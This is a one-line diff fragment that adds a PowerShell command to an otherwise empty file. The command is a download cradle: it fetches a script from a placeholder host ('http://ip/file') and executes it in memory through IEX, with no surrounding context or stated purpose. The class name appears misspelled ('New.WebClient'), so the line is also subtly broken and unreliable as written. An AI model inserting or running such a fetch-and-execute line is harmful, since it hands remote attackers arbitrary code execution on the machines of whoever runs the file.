@@ -1,1 +1,1 @@
-
+powershell "IEX(New-Object New.WebClient).downloadString('http://ip/file')"
